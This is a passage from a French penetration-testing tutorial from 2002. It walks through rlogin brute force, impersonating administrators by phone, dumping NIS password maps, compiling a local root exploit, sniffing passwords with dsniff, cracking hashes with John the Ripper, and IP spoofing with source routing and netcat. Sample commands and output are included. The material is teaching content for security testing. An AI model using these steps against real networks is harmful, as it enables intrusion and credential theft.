&nbsp;Par <I>brute force</I>, on peut trouver des mots de passe, lorsque que l'on a obtenu une liste de comptes valides (par exemple &agrave; l'aide de <I>sendmail</I>, voir section plus haut).<BR>
&nbsp;Un autre exemple, il suffit de demander par t&eacute;l&eacute;phone en se faisant passer pour un administrateur du r&eacute;seau aux utilisateurs eux-m&ecirc;mes. Une liste de num&eacute;ros de t&eacute;l&eacute;phone a pu &ecirc;tre obtenue dans la premi&egrave;re &eacute;tape (ceci s'appelle du <I>social engineering</I>).<BR>
</UL>
<B>Utilisation de <I>Find RLogin</I>:</B><BR></B><BR>
<PRE>
freebsd$ <B>./find_rlogin target_host accounts_list</B>
Trying login: root
Trying login: user01
Trying login: user02
Trying login: bill
</PRE>
&nbsp;Un fichier <B>logins.found</B> est cr&eacute;&eacute;, il contient les mots de passe des comptes trouv&eacute;s, ou bien les comptes qui poss&egrave;dent un <I>+</I> dans leur fichier <B>~/.rhosts</B>.<BR>
<BR>
<HR><H2>6. <A NAME="6">R&eacute;cup&eacute;ration d'informations, 2&egrave;me reconnaissance</A><FONT SIZE=1><A HREF="#start"> retour</A></FONT></H2>
<BR>
<BR><FONT SIZE=3><B>6.1. But</B></FONT><BR>
&nbsp;Une fois que l'on est dans le r&eacute;seau, c'est encore une &eacute;tape d'observation et de reconnaissance. Il faut savoir quels sont les serveurs de fichiers, de <I>backup</I>, de <I>log</I>s, <I>NIS</I>, et autres serveurs importants.<BR>
&nbsp;Il faut aussi savoir quelles sont les machines des administrateurs et le nom de <I>login</I> de ceux-ci. Compromettre le compte d'un administrateur n'est pas chose ais&eacute;e (en th&eacute;orie), mais une fois l'un de ces comptes acquis, de nombreuses portes peuvent s'ouvrir.<BR>
<BR>
<BR><FONT SIZE=3><B>6.2. Logiciels utilis&eacute;s</B></FONT><BR>
&nbsp;Ce sont en g&eacute;n&eacute;ral les outils standards qui sont utilis&eacute;s dans cette seconde &eacute;tape de reconnaissance. Des outils peuvent &ecirc;tre d&eacute;velopp&eacute;s pour cette t&acirc;che, mais la m&eacute;thode manuelle est tout aussi efficace.<BR>
 On peut quand m&ecirc;me installer un <I>sniffeur</I> (si vous avez obtenu un acc&egrave;s <I>root</I> dans l'&eacute;tape d'intrusion), pour voler d'autres comptes, et obtenir d'autres informations sur les machines du r&eacute;seau sur lequel on se trouve, mais il vaut mieux d'abord observer silencieusement, et savoir dans quelle mesure notre pr&eacute;sence peut &ecirc;tre rep&eacute;r&eacute;e sur le r&eacute;seau (si un <I>HIDS</I>, ou un <I>NIDS</I> est install&eacute;):
<UL>
<LI><I>Snoop</I>, ou <I>TcpDump</I><BR>
<LI><I>Siphon</I><BR>
</UL>
<BR>
<BR><FONT SIZE=3><B>6.3. M&eacute;thode</B></FONT><BR>
<UL>
<LI>Th&eacute;orie:<BR>
&nbsp;La premi&egrave;re chose &agrave; savoir est si le r&eacute;seau cible utilise les <I>NIS</I> pour g&eacute;rer les comptes des utilisateurs. Si oui, il suffit ensuite de r&eacute;cup&eacute;rer les <I>NIS map</I>s, qui regorgent d'informations susceptibles de d&eacute;crir le r&eacute;seau de A &agrave; Z, mais surtout d'obtenir la liste compl&egrave;te des comptes utilisateurs, ainsi que la cha&icirc;ne crypt&eacute;e de leur mot de passe (les <I>maps</I> importantes sont: <B>passwd</B> et <B>netgroup</B>).<BR>
<LI>Pratique:<BR>
&nbsp;Une fois introduit dans le r&eacute;seau, il suffit de taper la commande <B>domainname</B> pour obtenir le nom du domaine <I>NIS</I> si il y en a un. La commande <B>ypwhich</B> donne le nom du serveur <I>NIS</I>, faisant de celui-ci une cible.<BR>
&nbsp;Pour conna&icirc;tre le nom de <I>login</I> du ou des administrateurs, il suffit de taper la commande <B>rusers</B>, puis d'observer le r&eacute;sultat. Les machines sur lesquelles l'utilisateur <I>root</I> est pr&eacute;sent, ainsi qu'un autre nom d'utilitateur peut indiquer que celui-ci est le compte utilisateur d'un administrateur.<BR>
&nbsp;Une fois le compte de l'administrateur trouv&eacute;, il suffit de regarder sur quelles machines il est connect&eacute;, faisant de ces machines des cibles (car potentiellement les machines d'administration, donc certainement moins restreintes aux niveaux des acc&egrave;s aux machines utilisant les <I>TCP Wrappers</I> ou un <I>firewall</I>).<BR>
</UL>
<B><B>ypcat</B>:</B><BR>
<PRE>
solaris$ <B>domainname</B>
<I>nis_domain</I>
solaris$ <B>ypwhich</B>
<I>nis_server</I>
solaris$ <B>ypcat passwd > passwd_file</B>
solaris$ <B>ypcat -k netgroup > netgroup_file</B>
</PRE>
<BR>
<HR><H2>7. <A NAME="7">El&eacute;vation de privil&egrave;ges, 3&egrave;me reconnaissance</A><FONT SIZE=1><A HREF="#start"> retour</A></FONT></H2>
<BR>
<BR><FONT SIZE=3><B>7.1. But</B></FONT><BR>
&nbsp;Le but est d'acqu&eacute;rir des droits <I>root</I> sur un segment <I>ethernet</I> où de nombreux mots de passe et autres donn&eacute;es importantes circulent. Une fois <I>root</I> sur une telle machine, il suffit d'&ecirc;tre patient, pendant la phase de <I>sniffing</I> du r&eacute;seau.<BR>
&nbsp;Une autre chose &agrave; accomplir est le <I>crackage</I> de comptes utilisateurs, le fichier de mots de passe crypt&eacute; ayant &eacute;t&eacute; r&eacute;cup&eacute;r&eacute; &agrave; l'&eacute;tape pr&eacute;c&eacute;dente.<BR>
<BR>
<BR><FONT SIZE=3><B>7.2. Logiciels utilis&eacute;s</B></FONT><BR>
<UL>
<LI><I>DSniff</I> (<A HREF="http://www.monkey.org/~dugsong/dsniff/">http://www.monkey.org/~dugsong/dsniff/</A>), une suite d'outils pour <I>sniffer</I><BR>
<LI><I>Snoop</I>, install&eacute; avec <I>Solaris</I>, ou <I>TcpDump</I><BR>
<LI><I>John the Ripper</I> (rechercher le lien sur <I>Google</I>), <I>crackeur</I> de mots de passe<BR>
<LI>Des <I>exploits</I> locaux<BR>
</UL>
<BR>
<BR><FONT SIZE=3><B>7.3. M&eacute;thode</B></FONT><BR>
<UL>
<LI>Th&eacute;orie:<BR>
&nbsp;La premi&egrave;re chose est de devenir <I>root</I> sur la machine compromise, si ce n'est pas d&eacute;j&agrave; fait. Il suffit de rechercher une vuln&eacute;rabilit&eacute; locale sur celle-ci. En connaissant son <I>OS</I> et sa version, on peut trouver des <I>exploits</I> locaux pour accro&icirc;tre ses privil&egrave;ges.<BR>
&nbsp;Si aucun n'est trouv&eacute; pour cette machine, on peut soit trouver une autre machine avec un autre <I>OS</I> ou une autre version de celui-ci, soit chercher une vuln&eacute;rabilit&eacute; dans un logiciel tiers.<BR>
&nbsp;Une fois <I>root</I>, on peut <I>sniffer</I> les informations.<BR>
&nbsp;On peut &eacute;galement accro&icirc;tre ses privil&egrave;ges en volant le compte d'un administrateur en <I>crackant</I> son mot de passe.<BR>
<LI>Pratique:<BR>
</UL>
<B>Devenir <I>root</I>:</B><BR></B><BR>
<PRE>
solaris$ <B>uname -sr</B>
SunOS 5.8
</PRE>
&nbsp;Recherche d'un <I>exploit</I> local pour cette version de <I>Solaris</I> sur <I>SecurityFocus</I>. On trouve une vuln&eacute;rabilit&eacute; dans la biblioth&egrave;que <I>libsldap</I>, avec un <I>exploit</I>.<BR>
<PRE>
solaris$ <B>gcc exploit.c -o exploit</B>
solaris$ <B>./exploit</B>
solaris# <B>id</B>
uid=0(root) gid=0(root)
</PRE>
<B><I>Sniffer</I> (<I>DSniff</I>, <I>Snoop</I>, <I>Siphon</I>):</B><BR>
 <I>DSniff</I> ne capture que les mots de passe. Il reconnait un grand nombre de protocoles parmis ceux-ci: <I>Rlogin</I>, <I>Telnet</I>, <I>snmp</I>, <I>NetBIOS</I>.
<PRE>
freebsd# <B>dsniff</B>
dsniff: listening on xl0
<BR>
-----------------
08/08/01 11:07:57 udp host1.domain.fr.56030 -> host2.domain.fr.161 (snmp)
[version 1]
<I>password</I>
<BR>
-----------------
07/17/01 16:02:03 tcp host84.domain.fr.1023 -> host10.domain.fr.513 (rlogin)
[root:root]
<I>password</I>
<I>login</I>
<I>password</I>
ls
who
</PRE>
<B><I>Cracker</I> les mots de passe: <I>John the Ripper</I>:</B><BR>
 Pour r&eacute;cup&eacute;rer le fichier de mots de passe crypt&eacute;s, sur la machine compromise:
<PRE>
solaris$ <B>ypcat passwd > passwd_file</B>
</PRE>
 Il suffit ensuite de lancer le <I>cracker</I> en mode rapide sur ce fichier de mots de passe:
<PRE>
solaris$ <B>john -single <I>passwd_file</I></B>
</PRE>
<BR>
<HR><H2>8. <A NAME="8">Compromission des serveurs</A><FONT SIZE=1><A HREF="#start"> retour</A></FONT></H2>
<BR>
<BR><FONT SIZE=3><B>8.1. But</B></FONT><BR>
&nbsp;Maintenant qu'une machine du r&eacute;seau nous appartient, il faut tenter de contr&ocirc;ler le r&eacute;seau complet. A l'aide des informations r&eacute;cup&eacute;r&eacute;es pr&eacute;c&eacute;demment, il suffit successivement de devenir <I>root</I> sur chacunes des machines les plus importantes (analyser le fichier <B>netgroup</B>).<BR>
<BR>
<BR><FONT SIZE=3><B>8.2. Logiciels utilis&eacute;s</B></FONT><BR>
&nbsp;Les logiciels utilis&eacute;s ici sont les m&ecirc;mes que pour l'&eacute;tape d'intrusion sur le r&eacute;seau.<BR>
<BR>
<BR><FONT SIZE=3><B>8.3. M&eacute;thode</B></FONT><BR>
<UL>
<LI>Th&eacute;orie:<BR>
&nbsp;Gr&acirc;ce aux &eacute;tapes de reconnaissance, la topologie du r&eacute;seau est maintenant bien connue. Toutes les machines qui g&egrave;rent le r&eacute;seau sont identifi&eacute;es, toutes leurs failles &eacute;galement. Il ne reste plus qu'&agrave; continuer l'infection comme dans l'&eacute;tape pr&eacute;c&eacute;dent, jusqu'&agrave; ce que le r&eacute;seau soit enti&egrave;rement contr&ocirc;l&eacute;.<BR>
&nbsp;On sait &eacute;galement, gr&acirc;ce &agrave; <I>Siphon</I>, quelle machine &agrave; le droit d'acc&eacute;der &agrave; quelle machine (ou quel r&eacute;seau &agrave; le droit d'acc&eacute;der &agrave; quel r&eacute;seau), et on peut tenter l'<I>IP Spoofing</I> pour acc&eacute;der aux machines les plus s&eacute;curis&eacute;es. Cette m&eacute;thode peut parra&icirc;tre compliqu&eacute;e, mais il n'en est rien, nous allons le montrer tout de suite.<BR>
<LI>Pratique:<BR>
&nbsp;Le r&eacute;seau 192.168.0 est autoris&eacute; &agrave; acc&eacute;der au r&eacute;seau 192.168.1. Nous sommes sur le r&eacute;seau 192.168.10. Il faut que nous nous fassions passer pour une machine du r&eacute;seau 192.168.0 (le plus facile, si l'on se trouve sur le m&ecirc;me brin physique, est de trouver une adresse <I>IP</I> libre du r&eacute;seau 192.168.0).<BR>
&nbsp;Un routeur fait la jonction entre ces trois r&eacute;seaux, et il supporte le <I>source routing</I> (c'est pour cela qu'il faut desactiver cette option, pour des raisons de s&eacute;curit&eacute;). Il a donc trois interfaces r&eacute;seau, 192.168.0.1, 192.168.1.1, et 192.168.10.1.<BR>
</UL>
<PRE>
freebsd# <B>ifconfig vr0</B>
vr0: flags=8843<UP,BROADCAST,RUNNING,SIMPLEX,MULTICAST> mtu 1500
	inet 192.168.10.2 netmask 0xffffff00 broadcast 192.168.10.255
	ether 00:50:ba:a1:53:c7 
	media: 100baseTX <full-duplex> status: no carrier
	supported media: autoselect 100baseTX <full-duplex> 100baseTX 10baseT/UTP <full-duplex> 10baseT/UTP none
freebsd# <B>ifconfig vr0 inet 192.168.0.25 netmask 0xffffffff add</B>
freebsd# <B>ifconfig vr0</B>
vr0: flags=8843<UP,BROADCAST,RUNNING,SIMPLEX,MULTICAST> mtu 1500
	inet 192.168.10.2 netmask 0xffffff00 broadcast 192.168.10.255
	inet 192.168.0.25 netmask 0xffffffff broadcast 192.168.0.25
	ether 00:50:ba:a1:53:c7 
	media: 100baseTX <full-duplex> status: no carrier
	supported media: autoselect 100baseTX <full-duplex> 100baseTX 10baseT/UTP <full-duplex> 10baseT/UTP none
</PRE>
&nbsp;Nous avons configur&eacute; un alias r&eacute;seau sur notre interface en prenant une adresse <I>IP</I> appartenant au r&eacute;seau privil&eacute;gi&eacute;. Il suffit maintenant de se connecter au r&eacute;seau 192.168.1 en prenant comme adresse source cet alias.<BR>
 Pour cela, il faut utiliser une propri&eacute;t&eacute; du protocole <I>IP</I> qui est la possibilit&eacute; de choisir la route &agrave; emprunter (le <I>source routing</I>). Sous <I>FreeBSD</I>, il faut autoriser l'envoie et la r&eacute;ception de paquets <I>IP</I> utilisant cette capacit&eacute;, comme ceci (sous <I>FreeBSD 4.3</I>):
<PRE>
freebsd# <B>sysctl -w net.inet.ip.sourceroute=1</B>
freebsd# <B>sysctl -w net.inet.ip.accept_sourceroute=1</B>
freebsd# <B>sysctl -w net.inet.ip.forwarding=1</B>
</PRE>
&nbsp;Autoriser ceci uniquement pendant votre utilisation de l'<I>IP Spoofing</I>, car vous pourriez vous exposer vous-m&ecirc;me &agrave; des tentatives de <I>spoofing</I>.<BR>
&nbsp;On peut ensuite utiliser l'utilitaire <I>NetCat</I> pour effectuer une connexion <I>telnet</I> en pr&eacute;cisant la route &agrave; emprunter.<BR>
<PRE>
freebsd# <B>netcat -n -v -t -s 192.168.0.25 -g 192.168.10.2 -g 192.168.10.1 192.168.1.20 23</B>
</PRE>
&nbsp;Cette commande permet de se connecter en <I>telnet</I> &agrave; la machine 20 du r&eacute;seau 192.168.1 en prenant comme adresse source 192.168.0.25 (adresse faisant partie d'un r&eacute;seau autoris&eacute; &agrave; se connecter au r&eacute;seau 192.168.1), en passant d'abord par notre adresse <I>IP</I> (192.168.10.2: nous sommes devenu un routeur, car nous acceptons l'<I>IP forwarding</I>), puis en passant par le routeur qui poss&egrave;de 3 interfaces (192.168.10.1), puis on peut acc&eacute;der &agrave; la cible (192.168.1.20).<BR>
&nbsp;Puisque l'adresse 192.168.0.25 n'est pas utilis&eacute;e, il n'y aura aucun conflit.<BR>
&nbsp;Si tout va bien, vous &ecirc;tes connect&eacute; dans le r&eacute;seau 192.168.1.<BR>
&nbsp;Il est &agrave; noter qu'il y a des restrictions &agrave; cette technique d'usurpation d'identit&eacute;: il faut qu'il y ait moins de 8 routeurs entre la source et la destination. De plus, si vous vous trouvez sur le m&ecirc;me brin physique que la machine pour laquelle vous voulez vous faire passer, il y aura un conflit d'adresse, lors de la r&eacute;ception des donn&eacute;es, c'est-&agrave;-dire que 2 machines (vous, et celle pour qui vous voulez vous faire passer) recevront les donn&eacute;es. Donc 2 machines r&eacute;pondront. Par contre, sur des brins physiques diff&eacute;rents, il n'y aura qu'une machine d'une <I>IP</I> donn&eacute;e sur ce brin, donc une seule machine r&eacute;pondra.<BR>
&nbsp;Cet exemple est un exemple trivial, mais le principe fonctionne dans des r&eacute;seaux plus complexe que celui-ci.<BR>
<BR>
<HR><H2>9. <A NAME="9">Fin du test, nettoyage</A><FONT SIZE=1><A HREF="#start"> retour</A></FONT></H2>
<BR>
<BR><FONT SIZE=3><B>9.1. But</B></FONT><BR>
&nbsp;Le r&eacute;seau est maintenant enti&egrave;rement ma&icirc;tris&eacute;, ou tout ce qui &agrave; pu &ecirc;tre tent&eacute; pour en arriv&eacute; l&agrave; est termin&eacute;. Il faut nettoyer toutes les traces, tous les fichiers cr&eacute;&eacute;s ou modifi&eacute;s pour que le r&eacute;seau soit de nouveau propre.<BR>
&nbsp;Tous les probl&egrave;mes de s&eacute;curit&eacute; rencontr&eacute;s ont &eacute;t&eacute; not&eacute;s, un rapport doit maintenant &ecirc;tre &eacute;tabli.<BR>
<BR>
<BR><FONT SIZE=3><B>9.2. Logiciels utilis&eacute;s</B></FONT><BR>
&nbsp;Un outil de nettoyage peut &ecirc;tre d&eacute;velopp&eacute; pour accomplir cette t&acirc;che, mais le nettoyage &agrave; la main est &eacute;galement ais&eacute;, &agrave; condition d'avoir bien not&eacute; chacune des modifications que l'on a apport&eacute; au r&eacute;seau.<BR>
<BR>
<BR><FONT SIZE=3><B>9.3. M&eacute;thode</B></FONT><BR>
&nbsp;Suivre les notes prises pendant les &eacute;tapes pr&eacute;c&eacute;dentes, dans le sens inverse.<BR>
<BR>
<HR><H2>10. <A NAME="10">Conclusion</A><FONT SIZE=1><A HREF="#start"> retour</A></FONT></H2>
&nbsp;C'est la fin de cette introduction aux tests de p&eacute;n&eacute;tration, toutes les techniques et m&eacute;thodes n'ont pas &eacute;t&eacute; abord&eacute;es, mais un autre guide comme celui-ci sera peut-&ecirc;tre &eacute;crit prochainement, tra&icirc;tant d'aspects plus complexes que ceux &eacute;voqu&eacute;s ici.<BR>
&nbsp;Pour rapporter une erreur, ou ajouter un commentaire, n'h&eacute;sitez pas: <A HREF="mailto:GomoR@chez.com">mailto:GomoR@chez.com</A>.<BR>
<BR>
<HR><H2>11. <A NAME="11">D&eacute;charge</A><FONT SIZE=1><A HREF="#start"> retour</A></FONT></H2>
&nbsp;L'auteur ne peut &ecirc;tre tenu pour responsable des d&eacute;g&acirc;ts r&eacute;sultants de la mauvaise utilisation des connaissances et techniques d&eacute;crites dans ce guide.<BR>
<BR>
<HR><H2>12. <A NAME="12"><I>Copyright</I></A><FONT SIZE=1><A HREF="#start"> retour</A></FONT></H2>
<P>Ce document est fournis "tel qu'en l'&eacute;tat" par l'auteur (<A HREF="mailto:GomoR@gomor.org">mailto:GomoR@gomor.org</A>) et il n'est donn&eacute; aucune garantie, implicite ou explicite, quant &agrave; son utilisation commerciale, professionnelle ou autre.</P>
<P>L'auteur ne peut en aucun cas &ecirc;tre tenu pour responsable  de quelque dommage ou pr&eacute;judice direct, indirect, secondaire ou accessoire (y compris les pertes financi&egrave;res dues au manque &agrave; gagner, &agrave; l'interruption d'activit&eacute;s, ou la perte d'informations et autres) d&eacute;coulant de l'utilisation de la documentation ou de l'impossibilit&eacute; d'utiliser celle-ci, et dont l'utilisateur accepte l'enti&egrave;re responsabilit&eacute;.</P>
<P>Par ailleurs, ce document peut &ecirc;tre copier partiellement ou enti&egrave;rement, &agrave; condition que l'auteur soit cit&eacute;, et que son adresse <I>eMail</I> (<A HREF="mailto:GomoR@gomor.org">mailto:GomoR@gomor.org</A>) soit donn&eacute;e, dans cette copie.</P>
<FONT SIZE=1>Derni&egrave;re mise &agrave; jours: Tue Mar 19 09:45:29 CET 2002</FONT>
<HR>
</BODY>
</HTML>
